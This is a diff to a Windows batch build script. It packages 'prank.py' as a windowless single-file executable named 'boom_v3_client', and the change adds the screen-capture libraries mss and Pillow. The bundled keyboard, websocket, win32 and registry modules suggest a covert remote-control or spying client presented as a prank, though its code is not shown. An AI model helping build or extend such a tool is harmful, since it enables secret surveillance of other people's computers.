@@ -25,10 +25,10 @@ if errorlevel 1 (
 )
 
 echo [2/4] Installing dependencies...
-pip install pyinstaller websocket-client pywin32 keyboard
+pip install pyinstaller websocket-client pywin32 keyboard mss Pillow
 
 echo [3/4] Building EXE...
-pyinstaller --noconsole --onefile --add-data "temp_config.json;." --name boom_v3_client --hidden-import=keyboard --hidden-import=websocket --hidden-import=websocket._app --hidden-import=websocket._core --hidden-import=websocket._http --hidden-import=websocket._abnf --hidden-import=websocket._socket --hidden-import=websocket._url --hidden-import=websocket._handshake --hidden-import=websocket._logging --hidden-import=websocket._exceptions --hidden-import=win32gui --hidden-import=win32api --hidden-import=win32con --hidden-import=pywintypes --hidden-import=pythoncom --hidden-import=tkinter --hidden-import=winreg prank.py
+pyinstaller --noconsole --onefile --add-data "temp_config.json;." --name boom_v3_client --hidden-import=keyboard --hidden-import=websocket --hidden-import=websocket._app --hidden-import=websocket._core --hidden-import=websocket._http --hidden-import=websocket._abnf --hidden-import=websocket._socket --hidden-import=websocket._url --hidden-import=websocket._handshake --hidden-import=websocket._logging --hidden-import=websocket._exceptions --hidden-import=win32gui --hidden-import=win32api --hidden-import=win32con --hidden-import=pywintypes --hidden-import=pythoncom --hidden-import=tkinter --hidden-import=winreg --hidden-import=mss --hidden-import=PIL.Image prank.py
 
 if errorlevel 1 (
     echo [ERROR] Build failed.
